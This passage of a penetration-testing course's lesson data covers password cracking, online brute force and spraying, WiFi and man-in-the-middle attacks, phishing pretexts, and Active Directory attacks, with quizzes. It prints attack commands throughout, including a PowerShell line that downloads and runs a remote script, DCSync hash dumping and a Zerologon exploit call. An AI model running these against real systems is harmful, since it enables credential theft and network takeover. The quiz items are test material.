          {t:"code", v:"# ── IDENTIFY HASH TYPE ───────────────────────────────\nhashid 'hash_string'              # Identify hash type\nhash-identifier                   # Interactive identifier\n# OR check hash length/format:\n# MD5    = 32 hex chars\n# SHA1   = 40 hex chars  \n# SHA256 = 64 hex chars\n# NTLM   = 32 hex (Windows)\n# bcrypt = $2b$... (modern)\n# SHA512crypt = $6$... (Linux /etc/shadow)"},
          {t:"code", v:"# ── HASHCAT ─────────────────────────────────────────\n# Attack modes (-a):\n# 0 = Dictionary, 1 = Combination, 3 = Brute-force, 6/7 = Hybrid\n\n# MD5 dictionary attack:\nhashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# SHA1:\nhashcat -m 100 hash.txt rockyou.txt\n\n# NTLM (Windows):\nhashcat -m 1000 ntlm.txt rockyou.txt\n\n# SHA512crypt (Linux shadow):\nhashcat -m 1800 shadow.txt rockyou.txt\n\n# With rules (POWERFUL!):\nhashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# Brute force (up to 8 chars):\nhashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a?a\n\n# ── JOHN THE RIPPER ──────────────────────────────────\njohn hash.txt --wordlist=rockyou.txt\njohn --format=NT hash.txt --wordlist=rockyou.txt\njohn hash.txt --show                     # Show cracked\n\n# Unshadow (combine passwd + shadow for john):\nunshadow /etc/passwd /etc/shadow > hashes.txt\njohn hashes.txt --wordlist=rockyou.txt"},
          {t:"tip", v:"rockyou.txt (14 million passwords) lives at /usr/share/wordlists/rockyou.txt.gz on Kali. Gunzip it first! Also get SecLists from GitHub."},
        ],
        quiz:[
          {q:"Hashcat -m 1000 cracks which hash type?",a:["MD5","SHA1","NTLM (Windows)","bcrypt"],c:2},
          {q:"rockyou.txt is a?",a:["Hacking tool","Famous password wordlist (14M passwords)","Vulnerability scanner","Encoding tool"],c:1},
          {q:"Hashcat -a 3 uses which attack mode?",a:["Dictionary","Combination","Brute-force (mask)","Hybrid"],c:2},
          {q:"John the Ripper --show does?",a:["Show help","Show cracked passwords","Show hash format","Show rules"],c:1},
          {q:"unshadow combines?",a:["Two wordlists","passwd + shadow for John cracking","Hash outputs","Rainbow tables"],c:1},
        ]
      },
      { id:"m9l2", title:"Brute Force, Spraying & Default Creds", xp:100,
        content:[
          {t:"h", v:"// ONLINE ATTACKS: BRUTE FORCE & CREDENTIAL SPRAYING"},
          {t:"code", v:"# ── HYDRA — ONLINE BRUTE FORCE ──────────────────────\n# SSH brute force:\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET\nhydra -L users.txt -P passwords.txt ssh://TARGET\n\n# FTP:\nhydra -l admin -P rockyou.txt ftp://TARGET\n\n# HTTP POST login form:\nhydra -l admin -P rockyou.txt TARGET http-post-form \\\n  '/login:username=^USER^&password=^PASS^:Invalid credentials'\n\n# RDP:\nhydra -t 1 -l admin -P rockyou.txt rdp://TARGET\n\n# ── CREDENTIAL SPRAYING ────────────────────────────────\n# 1 password → many users (avoids lockout!)\nhydra -L users.txt -p 'Winter2024!' ssh://TARGET -t 1\ncrackmap exec TARGET -u users.txt -p 'Password123' --continue-on-success\n\n# ── DEFAULT CREDENTIALS ────────────────────────────────\n# Always try these FIRST:\nadmin:admin      admin:password    admin:1234\nroot:root        admin:123456      admin:(blank)\n\n# Resources:\nhttps://cirt.net/passwords        # Default credential database\nhttps://www.default-password.info # Search by device\n\n# ── MEDUSA & NCRACK ───────────────────────────────────\nmedusa -h TARGET -u admin -P rockyou.txt -M ssh\nncrack -p 22 --user admin -P rockyou.txt TARGET"},
          {t:"warn", v:"⚠️ Brute force attacks WILL trigger account lockouts and IDS alerts. Always check lockout policy before attacking. Use spraying for stealth!"},
        ],
        quiz:[
          {q:"Hydra is used for?",a:["Hash cracking","Online brute force attacks","Port scanning","Exploit development"],c:1},
          {q:"Credential spraying uses?",a:["Many passwords → 1 user","1 password → many users (avoids lockout)","Default only","Hash injection"],c:1},
          {q:"http-post-form in Hydra is for?",a:["HTTP GET attacks","Web form login brute force","Port 80 only","API attacks"],c:1},
          {q:"Default credentials should be tested?",a:["Last","First — quickest win!","Never","Only on routers"],c:1},
          {q:"Credential spraying avoids what issue?",a:["Firewall detection","Account lockout","IDS alerts","Bandwidth limits"],c:1},
        ]
      },
    ],
    test:[
      {q:"Hashcat -m 0 cracks?",a:["SHA1","MD5","NTLM","bcrypt"],c:1},
      {q:"rockyou.txt location on Kali?",a:["/usr/share/wordlists/rockyou.txt","~/wordlists/","/ rockyou","Downloads/"],c:0},
      {q:"Credential spraying sends?",a:["Many passwords to 1 user","1 password to many users","Random passwords","Only default passwords"],c:1},
      {q:"unshadow combines?",a:["Wordlists","passwd and shadow files","Hash types","Rules"],c:1},
      {q:"Hydra is an online ___ tool?",a:["Hash cracker","Brute-force tool","Port scanner","Exploit framework"],c:1},
      {q:"hashcat -a 3 is?",a:["Dictionary attack","Combinator","Brute-force/mask attack","Hybrid"],c:2},
      {q:"John the Ripper --rules applies?",a:["Wordlist rules","Transformation rules to wordlist","Network rules","Hash rules"],c:1},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 10 — WIRELESS HACKING
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m10", title:"Wireless Hacking", emoji:"📡",
    color:"#1abc9c", xp:800, desc:"WiFi attacks, WPA2 cracking & Bluetooth hacking",
    lessons:[
      { id:"m10l1", title:"WiFi Security & WPA2 Cracking", xp:110,
        content:[
          {t:"h", v:"// WIRELESS HACKING: ATTACK THE AIRWAVES"},
          {t:"p", v:"WiFi hacking is a critical skill. Most corporate networks have WiFi. In Bangladesh, millions of networks use WPA2 with weak passwords — a massive attack surface."},
          {t:"code", v:"# ── REQUIREMENTS ─────────────────────────────────────\n# Wireless adapter that supports monitor mode:\n# - Alfa AWUS036ACH (recommended)\n# - Alfa AWUS036NH\n# - Panda PAU09\n\n# ── MONITOR MODE ─────────────────────────────────────\niwconfig                          # List wireless interfaces\nairmon-ng start wlan0             # Enable monitor mode → wlan0mon\nairmon-ng check kill              # Kill interfering processes\n\n# ── SCAN FOR NETWORKS ─────────────────────────────────\nairodump-ng wlan0mon              # Show all nearby networks\nairodump-ng --bssid TARGET_BSSID -c CHANNEL -w capture wlan0mon  # Focus\n\n# ── WPA2 4-WAY HANDSHAKE CAPTURE ─────────────────────\n# Wait for client to connect (may take minutes)\n# OR: Deauth attack to force reconnect:\naireplay-ng --deauth 10 -a TARGET_BSSID wlan0mon\n# → Client disconnects → reconnects → WPA2 handshake captured!\n\n# ── CRACK THE HANDSHAKE ───────────────────────────────\naircrack-ng capture.cap -w rockyou.txt  # CPU\nhashcat -m 22000 capture.hc22000 rockyou.txt  # GPU (faster!)"},
          {t:"code", v:"# ── EVIL TWIN ATTACK ─────────────────────────────────\n# Create fake AP with same SSID → victim connects → intercept\nairbase-ng -e 'TargetSSID' -c 6 wlan0mon\n# Better: hostapd-wpe (auto credential capture)\n\n# ── WPS ATTACKS ───────────────────────────────────────\n# WPS PIN is 8 digits = only 11,000 combinations!\nwash -i wlan0mon                  # Find WPS-enabled APs\nreaver -i wlan0mon -b TARGET_BSSID -vv  # Brute WPS PIN\nbully -b TARGET_BSSID wlan0mon -v 3\n\n# ── WEP CRACKING (Deprecated but still found) ─────────\nairodump-ng -w wep --bssid TARGET -c 6 wlan0mon\naireplay-ng -3 -b TARGET wlan0mon  # ARP replay → inject packets\naircrack-ng wep.cap                # Crack after enough IVs"},
          {t:"warn", v:"⚠️ Only attack WiFi networks you own or have explicit written authorization to test. WiFi hacking without permission = serious criminal offense in Bangladesh!"},
        ],
        quiz:[
          {q:"airmon-ng start wlan0 enables?",a:["Ad-hoc mode","Monitor mode (capture all packets)","AP mode","Injection mode"],c:1},
          {q:"Deauth attack in WiFi is used to?",a:["Block all WiFi","Force client to reconnect (capture handshake)","Crack WEP","Enable monitor mode"],c:1},
          {q:"WPA2 cracking requires capturing?",a:["IV packets","4-way handshake","WPS PIN","Beacon frames"],c:1},
          {q:"WPS is vulnerable because?",a:["Old encryption","8-digit PIN has only ~11,000 combinations","Default password","No authentication"],c:1},
          {q:"Evil Twin attack creates?",a:["Fake client","Fake access point with same SSID","WPS attack","Deauth flood"],c:1},
        ]
      },
      { id:"m10l2", title:"MitM Attacks & Network Sniffing", xp:100,
        content:[
          {t:"h", v:"// MAN-IN-THE-MIDDLE: INTERCEPT ALL TRAFFIC"},
          {t:"p", v:"MitM attacks position the attacker between two communicating parties. Every packet flows through you — credentials, sessions, everything."},
          {t:"code", v:"# ── ARP SPOOFING → MitM ─────────────────────────────\n# ARP is unauthenticated — easily spoofed!\narp -n                            # View ARP table\n\n# Tell victim: 'I am the gateway'\n# Tell gateway: 'I am the victim'\narpspoof -i eth0 -t VICTIM GATEWAY\narpspoof -i eth0 -t GATEWAY VICTIM\n\n# Enable IP forwarding (so traffic flows through you):\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# All-in-one:\nettercap -T -q -i eth0 -M arp:remote /VICTIM// /GATEWAY//\n\n# ── BETTERCAP (Modern MitM Framework) ────────────────\nbettercap -iface eth0\nbettercap> net.probe on\nbettercap> arp.spoof on\nbettercap> net.sniff on\nbettercap> https.proxy on      # SSL stripping!\n\n# ── WIRESHARK ANALYSIS ────────────────────────────────\nwireshark                         # GUI packet analyzer\ntshark -i eth0                    # CLI version\ntshark -i eth0 -Y 'http.authbasic'  # Filter HTTP auth\ntshark -i eth0 -Y 'ftp.request.command == PASS'  # FTP passwords!\ntshark -i eth0 -Y 'smtp.req.parameter'  # Email credentials"},
          {t:"tip", v:"HTTPS (SSL/TLS) prevents MitM credential theft. But SSL stripping downgrades HTTPS to HTTP if HSTS not implemented. Always check for HSTS headers!"},
        ],
        quiz:[
          {q:"ARP spoofing exploits what weakness?",a:["Encryption","ARP is unauthenticated — no verification","Firewall rules","DNS resolution"],c:1},
          {q:"IP forwarding must be enabled in MitM because?",a:["Required by ARP","So intercepted traffic continues flowing to destination","For encryption","For speed"],c:1},
          {q:"Wireshark is used for?",a:["Port scanning","Packet capture and analysis","Password cracking","Exploit development"],c:1},
          {q:"SSL stripping converts?",a:["HTTP → HTTPS","HTTPS → HTTP (downgrade attack)","TCP → UDP","IPv6 → IPv4"],c:1},
          {q:"Bettercap is best described as?",a:["Port scanner","Modern MitM attack framework","Exploit database","Password cracker"],c:1},
        ]
      },
    ],
    test:[
      {q:"Monitor mode allows?",a:["Block packets","Capture all nearby WiFi packets","Inject packets only","Create AP"],c:1},
      {q:"WPA2 4-way handshake captured when?",a:["Client sends data","Client connects/reconnects","After deauth","Any time"],c:1},
      {q:"ARP spoofing is a?",a:["L3 attack","L2 attack (ARP = Data Link)","L7 attack","L4 attack"],c:1},
      {q:"Wireshark filters FTP passwords with?",a:["ftp.password","ftp.request.command == PASS","ftp.credential","ftp.auth"],c:1},
      {q:"WPS brute force works because?",a:["WPA2 is weak","WPS 8-digit PIN = limited combinations","Default passwords","Monitor mode"],c:1},
      {q:"IP forwarding (echo 1 > ...) in MitM?",a:["Enable ARP","Allow intercepted traffic to flow through","Enable monitor mode","Route table update"],c:1},
      {q:"Bettercap command for SSL interception?",a:["ssl.strip on","https.proxy on","tls.attack on","ssl.intercept on"],c:1},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 11 — SOCIAL ENGINEERING
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m11", title:"Social Engineering", emoji:"🎭",
    color:"#e74c3c", xp:700, desc:"Phishing, pretexting, SET & human exploitation",
    lessons:[
      { id:"m11l1", title:"Phishing, Pretexting & SE Techniques", xp:100,
        content:[
          {t:"h", v:"// SOCIAL ENGINEERING: HACKING THE HUMAN"},
          {t:"p", v:"The most powerful attacks target humans, not systems. 91% of cyberattacks start with phishing. No patch can fix human psychology."},
          {t:"list", v:["Phishing — Deceptive email to steal credentials or deliver malware","Spear Phishing — Targeted phishing using personal details about victim","Whaling — Phishing targeting executives (CFO, CEO)","Vishing — Voice phishing over phone calls","Smishing — SMS-based phishing","Pretexting — Creating fabricated scenario to extract info","Baiting — Leaving infected USB drives in parking lots","Tailgating — Physical entry by following authorized person","Quid Pro Quo — Offering service in exchange for info"]},
          {t:"code", v:"# ── SOCIAL ENGINEERING TOOLKIT (SET) ────────────────\nsetoolkit                         # Launch SET\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester Attack\n# Enter target URL to clone → SET clones the site!\n# Send phishing link → victim enters credentials → SET captures!\n\n# ── GOPHISH — PROFESSIONAL PHISHING PLATFORM ─────────\nhttps://getgophish.com\n# - Send bulk phishing emails with tracking\n# - See who opened, clicked, submitted creds\n# - Generate detailed campaign reports\n\n# ── EMAIL SPOOFING TEST ───────────────────────────────\n# Check if domain has SPF/DKIM/DMARC:\ndig TXT target.com | grep spf\nnslookup -type=txt target.com\n# No SPF = email spoofing possible!"},
        ],
        quiz:[
          {q:"91% of cyberattacks start with?",a:["Port scanning","Phishing","SQL injection","Buffer overflow"],c:1},
          {q:"Spear phishing differs from phishing by?",a:["Uses different tools","Targets specific individual with personal details","Only targets executives","Only via SMS"],c:1},
          {q:"Whaling targets?",a:["All employees","Executives (CEO, CFO, etc.)","IT staff","Help desk"],c:1},
          {q:"Social Engineering Toolkit (SET) is used for?",a:["Port scanning","Automated social engineering attacks","Password cracking","Network mapping"],c:1},
          {q:"No SPF record means?",a:["No SSL","Email spoofing is possible","No firewall","No HTTPS"],c:1},
        ]
      },
      { id:"m11l2", title:"Physical Security & OSINT for SE", xp:90,
        content:[
          {t:"h", v:"// PHYSICAL SECURITY & OSINT FOR SOCIAL ENGINEERING"},
          {t:"p", v:"The most powerful social engineering uses real OSINT about the target. Research employees, org structure, technologies, and culture before any engagement."},
          {t:"code", v:"# ── EMPLOYEE OSINT ───────────────────────────────────\n# LinkedIn: Find name, role, tech stack, projects\n# Tools:\nmalta maltego       # Visual mapping\nholehe email@target.com  # Email on which sites?\nmaigret username    # Username across 500+ sites\nsherlock username   # Username search\n\n# ── PRETEXT DEVELOPMENT ──────────────────────────────\n# Good pretexts use real info:\n# 'Hi, I'm from IT helpdesk, your account shows suspicious login from BD'\n# 'This is [CEO name]'s assistant, he needs your credentials ASAP'\n# 'UPS driver: package requires signature'\n\n# ── DEFENDING AGAINST SE ──────────────────────────────\n# 1. Security awareness training — mandatory annual\n# 2. Simulated phishing campaigns\n# 3. Clear verification procedures\n# 4. 'Slow down and verify' culture\n# 5. Report suspicious contacts immediately\n# 6. Least privilege — minimize blast radius\n# 7. MFA on ALL accounts"},
          {t:"tip", v:"The best defense against social engineering is a culture where employees feel SAFE to report suspicious contacts without fear of blame."},
        ],
        quiz:[
          {q:"Maltego is used for?",a:["Packet analysis","Visual OSINT relationship mapping","Password cracking","Port scanning"],c:1},
          {q:"Best defense against SE attacks?",a:["Better firewall","Security awareness training + verification culture","Stronger passwords","Antivirus"],c:1},
          {q:"Pretexting means?",a:["Sending phishing emails","Creating fabricated scenario to manipulate target","Physical tailgating","USB baiting"],c:1},
          {q:"Holehe tool finds?",a:["Email servers","Which websites an email is registered on","Open ports","Hashed passwords"],c:1},
          {q:"Effective SE pretext uses?",a:["Technical jargon","Real OSINT about the target to sound credible","Fear and urgency only","Generic templates"],c:1},
        ]
      },
    ],
    test:[
      {q:"Phishing attack medium?",a:["SSH","Email (primarily)","Nmap","Metasploit"],c:1},
      {q:"Vishing is phishing via?",a:["Email","Voice/phone calls","SMS","Website"],c:1},
      {q:"SET stands for?",a:["Security Exploit Tool","Social Engineering Toolkit","System Exploit Test","Secure Encryption Tool"],c:1},
      {q:"Tailgating is a ___ attack?",a:["Network","Physical security bypass","Phishing","Wireless"],c:1},
      {q:"SPF record prevents?",a:["Port scanning","Email spoofing from unauthorized servers","SQL injection","XSS"],c:1},
      {q:"Baiting uses?",a:["Email","Infected physical media (USB, CD)","Phone calls","SMS"],c:1},
      {q:"MFA (Multi-Factor Authentication) primarily protects against?",a:["SQLi","Password-only attacks including phishing","XSS","Buffer overflow"],c:1},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 12 — CRYPTOGRAPHY FOR HACKERS
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m12", title:"Cryptography for Hackers", emoji:"🔐",
    color:"#3498db", xp:700, desc:"Encryption, hashing, PKI & crypto attacks",
    lessons:[
      { id:"m12l1", title:"Encryption, Hashing & PKI Fundamentals", xp:90,
        content:[
          {t:"h", v:"// CRYPTOGRAPHY: THE FOUNDATION OF SECURITY (AND ATTACKS)"},
          {t:"p", v:"Understanding crypto lets you identify WEAK crypto — and exploit it. Hashed passwords, encrypted comms, PKI all have common weaknesses."},
          {t:"code", v:"# ── ENCRYPTION TYPES ─────────────────────────────────\n# Symmetric (same key to encrypt + decrypt):\n# AES-256 ← Gold standard (fast, secure)\n# DES/3DES ← OLD and WEAK — avoid!\n# RC4 ← Broken! Found in old WEP/WPA\n\n# Asymmetric (key pair: public + private):\n# RSA ← Most common (key exchange, signatures)\n# ECDSA/ECDH ← Elliptic curve — smaller, faster\n# ElGamal ← Used in PGP\n\n# ── HASHING ───────────────────────────────────────────\n# Hash = one-way function, fixed output\n# MD5    (128-bit) ← BROKEN — collision attacks\n# SHA1   (160-bit) ← WEAK — avoid for signing\n# SHA256 (256-bit) ← Secure — use this\n# SHA512 (512-bit) ← Very secure\n# bcrypt           ← Best for passwords (slow by design)\n\necho -n 'password' | md5sum      # Get MD5 hash\necho -n 'password' | sha256sum   # Get SHA256 hash\n\n# ── ENCODING vs ENCRYPTION vs HASHING ─────────────────\n# Encoding: Reversible, no key (Base64, URL)\n# Encryption: Reversible with key\n# Hashing: ONE-WAY, no key, fixed output\necho 'hello' | base64            # Encode\necho 'aGVsbG8K' | base64 -d     # Decode"},
          {t:"code", v:"# ── SSL/TLS ANALYSIS ─────────────────────────────────\nopenssl s_client -connect target.com:443  # Check cert\nsslscan target.com               # Check SSL/TLS config\ntestssl.sh target.com            # Comprehensive SSL check\n# Look for: weak ciphers, old TLS versions, cert issues\n\n# ── PKI CONCEPTS ──────────────────────────────────────\n# Certificate contains: domain, public key, CA signature, expiry\n# CA = Certificate Authority (DigiCert, Let's Encrypt, etc.)\n# Self-signed cert = no CA verification = WARNING!"},
        ],
        quiz:[
          {q:"AES-256 is which type of encryption?",a:["Asymmetric","Symmetric (same key)","Hashing","Encoding"],c:1},
          {q:"MD5 is considered?",a:["Most secure","Broken — collision attacks possible","Best for passwords","Quantum resistant"],c:1},
          {q:"bcrypt is best for passwords because?",a:["Short output","Deliberately slow (makes cracking hard)","Most common","Open source"],c:1},
          {q:"Base64 is a form of?",a:["Encryption","Hashing","Encoding (reversible, no key)","Compression"],c:2},
          {q:"SSL/TLS protects against?",a:["SQL injection","Network sniffing/MitM","XSS","Brute force"],c:1},
        ]
      },
      { id:"m12l2", title:"Common Crypto Attacks & Weaknesses", xp:100,
        content:[
          {t:"h", v:"// CRYPTO ATTACKS: BREAK THE ENCRYPTION"},
          {t:"code", v:"# ── HASH CRACKING ────────────────────────────────────\nhashcat -m 0 md5_hash.txt rockyou.txt    # MD5\nhashcat -m 100 sha1_hash.txt rockyou.txt # SHA1\n# Rainbow tables — precomputed hash lookups:\nhttps://crackstation.net    # Online rainbow tables\nhttps://hashes.com          # Another online cracker\n\n# ── COMMON CRYPTO MISTAKES ───────────────────────────\n# 1. Hardcoded keys in source code:\ngrep -r 'api_key\\|password\\|secret' . --include='*.py'\ngrep -rn 'BEGIN RSA' . --include='*.txt'  # Private keys!\n\n# 2. JWT Attacks (JSON Web Tokens):\n# Decode JWT (no key needed for JWT decode):\nimport base64, json\npayload = jwt.split('.')[1] + '=='   # Add padding\njson.loads(base64.b64decode(payload))# Decoded!\n# Algorithm confusion: change alg to 'none'\n# Weak secrets: crack with hashcat -m 16500\nhashcat -m 16500 jwt.txt rockyou.txt\n\n# 3. ECB mode block cipher (pattern leak):\n# Same plaintext block = same ciphertext block\n# Detectable in encrypted images!"},
          {t:"tip", v:"Always look for hardcoded secrets in GitHub repos! Use: github.com/trufflesecurity/trufflehog — it scans repos for leaked secrets automatically!"},
        ],
        quiz:[
          {q:"Rainbow tables are precomputed?",a:["Encryption keys","Hash-to-plaintext lookup tables","Wordlists","Exploit databases"],c:1},
          {q:"Hardcoded API key in source code is a?",a:["Feature","Critical security vulnerability","Design pattern","Optimization"],c:1},
          {q:"JWT alg:none attack means?",a:["No algorithm","Bypass signature verification","Null algorithm","No auth"],c:1},
          {q:"TruffleHog scans for?",a:["Port vulnerabilities","Leaked secrets and credentials in code repos","SQL injection","Malware"],c:1},
          {q:"ECB cipher mode weakness is?",a:["Slow speed","Same plaintext = same ciphertext (pattern leakage)","No key needed","Short blocks"],c:1},
        ]
      },
    ],
    test:[
      {q:"Symmetric encryption uses?",a:["Two keys","Same key for encrypt/decrypt","Public key only","No key"],c:1},
      {q:"MD5 is considered?",a:["Most secure","Broken","Best for passwords","Quantum safe"],c:1},
      {q:"bcrypt advantage for passwords?",a:["Short hash","Deliberately slow — resists cracking","Reversible","Most common"],c:1},
      {q:"Base64 is?",a:["Encryption","Hashing","Encoding (no key, reversible)","Compression"],c:2},
      {q:"sslscan tests?",a:["Port availability","SSL/TLS configuration weaknesses","Password strength","DNS config"],c:1},
      {q:"JWT signature can be bypassed with?",a:["SQL injection","Algorithm confusion (alg: none)","XSS","Buffer overflow"],c:1},
      {q:"TruffleHog is used to?",a:["Scan ports","Find hardcoded secrets in git repos","Crack hashes","Fuzz web apps"],c:1},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 13 — ACTIVE DIRECTORY ATTACKS
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m13", title:"Active Directory Attacks", emoji:"🏛️",
    color:"#c0392b", xp:1100, desc:"AD enumeration, Kerberoasting, BloodHound & domain takeover",
    lessons:[
      { id:"m13l1", title:"Active Directory — Concepts & Enumeration", xp:120,
        content:[
          {t:"h", v:"// ACTIVE DIRECTORY: CORPORATE HACKING GOLD"},
          {t:"p", v:"Active Directory is Microsoft's directory service used by 95% of Fortune 500 companies. Compromising AD = compromising the ENTIRE organization. Every professional pentester MUST know AD."},
          {t:"code", v:"# ── AD KEY CONCEPTS ─────────────────────────────────\n# Domain Controller (DC) — Central AD server, holds all auth\n# Domain — Organization's network (company.local)\n# OU (Organizational Unit) — Container for objects\n# Users, Groups, Computers — AD objects\n# Kerberos — AD's authentication protocol\n# LDAP — Protocol to query AD\n# GPO — Group Policy Objects (deployed settings)\n\n# ── AD ENUMERATION (from Windows) ────────────────────\nnet user /domain                   # All domain users\nnet group /domain                  # All domain groups\nnet group 'Domain Admins' /domain  # Domain admin members (GOAL!)\nnltest /domain_trusts              # Domain trusts\nnet accounts /domain               # Password policy (lockout!)\n\n# ── BLOODHOUND — VISUAL AD ATTACK PATH ────────────────\n# Best tool for AD attack path visualization\n# Collector (run on victim machine):\npowershell -exec bypass -c 'IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1\"); Invoke-BloodHound'\n# Then import .zip to BloodHound GUI\n# Find: Shortest path to Domain Admins!"},
          {t:"code", v:"# ── AD ENUM FROM LINUX ────────────────────────────────\n# ldapdomaindump:\nldapdomaindump -u 'DOMAIN\\user' -p 'pass' TARGET\n\n# enum4linux-ng:\nenum4linux-ng -A TARGET\n\n# rpcclient:\nrpcclient -U 'user%pass' TARGET\nrpcclient > enumdomusers           # All users\nrpcclient > enumdomgroups          # All groups\n\n# CrackMapExec:\ncrackmap exec TARGET -u user -p pass --users\ncrackmap exec TARGET -u user -p pass --groups\ncrackmap exec TARGET -u user -p pass --pass-pol  # Password policy!"},
        ],
        quiz:[
          {q:"Domain Controller (DC) stores?",a:["Website files","All Active Directory authentication data","Database files","Email"],c:1},
          {q:"BloodHound is used for?",a:["Hash cracking","Visualizing AD attack paths to Domain Admin","Port scanning","Phishing"],c:1},
          {q:"'net group Domain Admins /domain' shows?",a:["Network groups","Members of Domain Admins group","Domain computers","Domain policies"],c:1},
          {q:"Kerberos is?",a:["A Linux tool","AD's authentication protocol","A CVE","A scanning tool"],c:1},
          {q:"SharpHound is the BloodHound?",a:["GUI interface","Data collector (runs on victim)","Attack module","Hash cracker"],c:1},
        ]
      },
      { id:"m13l2", title:"Kerberoasting, Pass-the-Hash & Domain Takeover", xp:140,
        content:[
          {t:"h", v:"// AD ATTACKS: FROM USER TO DOMAIN ADMIN"},
          {t:"code", v:"# ── KERBEROASTING ─────────────────────────────────────\n# Request service tickets for service accounts → crack offline!\n# Any domain user can do this — no special privs!\n\n# Linux (Impacket):\nGetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request\n# Saves hashes to file → crack with hashcat:\nhashcat -m 13100 kerberoast.txt rockyou.txt\n\n# Windows:\npowershell -c 'Import-Module .\\Invoke-Kerberoast.ps1; Invoke-Kerberoast'\n\n# ── AS-REP ROASTING ────────────────────────────────────\n# Users without Kerberos pre-auth → get crackable hash!\nGetNPUsers.py DOMAIN/ -dc-ip DC_IP -usersfile users.txt -no-pass\nhashcat -m 18200 asrep.txt rockyou.txt\n\n# ── PASS THE HASH (Windows) ────────────────────────────\n# Use NTLM hash directly — no need to crack!\npsexec.py -hashes ':NTLM_HASH' admin@TARGET\nwmiexec.py -hashes ':NTLM_HASH' admin@TARGET\nsmbexec.py -hashes ':NTLM_HASH' admin@TARGET\n\n# ── DCSync — DOMAIN TAKEOVER ──────────────────────────\n# Requires Domain Admin or replication rights:\nsecretsdump.py DOMAIN/admin:pass@DC_IP    # Dump ALL hashes!\n# → Dump krbtgt hash → Create Golden Ticket → Own domain FOREVER\n\n# ── ZEROLOGON (CVE-2020-1472) ─────────────────────────\n# No credentials needed → reset DC machine account → domain admin!\npython3 zerologon_tester.py DC_NAME DC_IP  # Test\npython3 cve-2020-1472-exploit.py DC_NAME DC_IP  # Exploit"},
          {t:"warn", v:"🚨 Kerberoasting, DCSync, Zerologon = NUCLEAR level attacks. In BD corporate networks, these can compromise thousands of accounts. AUTHORIZED TESTING ONLY."},
        ],
        quiz:[
          {q:"Kerberoasting targets?",a:["Domain Admin accounts","Service Principal Names (SPNs) — crackable offline","Kerberos server directly","Random users"],c:1},
          {q:"Kerberoast hashes cracked with hashcat mode?",a:["-m 0 (MD5)","-m 13100 (Kerberos 5 TGS)","-m 1000 (NTLM)","-m 1800 (SHA512)"],c:1},
          {q:"DCSync attack dumps?",a:["Web traffic","All Active Directory password hashes","File system","Network packets"],c:1},
          {q:"Zerologon (CVE-2020-1472) requires what credentials?",a:["Domain Admin","Regular user","No credentials at all!","Service account"],c:2},
          {q:"krbtgt hash compromise allows?",a:["Read files only","Create Golden Tickets — own domain forever","Reset passwords","Delete users"],c:1},
        ]
      },
    ],
    test:[
      {q:"DC stands for?",a:["Data Controller","Domain Controller","Directory Container","Dynamic Config"],c:1},
      {q:"Kerberoasting requires what privilege?",a:["Domain Admin","Enterprise Admin","Any domain user account","Local admin only"],c:2},
      {q:"Hashcat mode for Kerberoast?",a:["1000","13100","18200","1800"],c:1},
      {q:"DCSync dumps?",a:["DNS records","All AD hashes via replication","File hashes","Net traffic"],c:1},
      {q:"BloodHound finds?",a:["Web vulns","AD attack paths to Domain Admin","Open ports","File inclusion"],c:1},
      {q:"Golden Ticket requires?",a:["Any user hash","krbtgt account hash","Domain Admin pass","DC IP only"],c:1},
      {q:"AS-REP Roasting targets users with?",a:["Weak passwords","Kerberos pre-auth disabled","Admin rights","SPNs"],c:1},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 14 — BUG BOUNTY & REPORT WRITING
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m14", title:"Bug Bounty & Report Writing", emoji:"💰",
    color:"#f39c12", xp:800, desc:"Bug bounty methodology, programs & professional reporting",
    lessons:[
      { id:"m14l1", title:"Bug Bounty Methodology & Programs", xp:100,
        content:[
          {t:"h", v:"// BUG BOUNTY: GET PAID TO HACK — LEGALLY"},
          {t:"p", v:"Bug bounty programs pay ethical hackers to find vulnerabilities. Top hunters earn $100K+ per year. Bangladesh hackers are increasingly competitive globally."},
          {t:"code", v:"# ── TOP BUG BOUNTY PLATFORMS ─────────────────────────\nhttps://hackerone.com         # Largest platform\nhttps://bugcrowd.com          # Many programs\nhttps://intigriti.com         # European focus\nhttps://yeswehack.com         # Growing\nhttps://vulnerability.com     # BD/SA region\n\n# ── PAYOUT RANGES (CVSS-based) ──────────────────────\nInformational  → $0-50   (Low impact)\nLow            → $50-500\nMedium         → $500-5000\nHigh           → $5000-50000\nCritical (P1)  → $10000-$1,000,000+\n# Google paid $605,000 for a single Android exploit chain!\n\n# ── METHODOLOGY ──────────────────────────────────────\n# 1. Read the program policy COMPLETELY (scope!)\n# 2. Asset discovery: subdomains, IPs, mobile apps\n# 3. Technology fingerprinting\n# 4. Automated scanning (safely, within rate limits)\n# 5. Manual testing of interesting endpoints\n# 6. Test OWASP Top 10 systematically\n# 7. Find business logic flaws (often highest payouts)\n# 8. Document thoroughly as you go\n# 9. Write clear reproducible report\n# 10. Responsible disclosure — follow timeline"},
          {t:"tip", v:"Start with small/medium programs. Read disclosed reports on HackerOne to learn what vulnerabilities exist and how to report them. Study top hunter writeups!"},
        ],
        quiz:[
          {q:"Largest bug bounty platform?",a:["Bugcrowd","HackerOne","Intigriti","Vulnerability.com"],c:1},
          {q:"Critical (P1) bug payouts can be?",a:["$0-500","$500-5000","$5000-50000","$10,000-$1M+"],c:3},
          {q:"First step in bug bounty methodology?",a:["Start scanning immediately","Read program policy and scope completely","Create account only","Check payouts"],c:1},
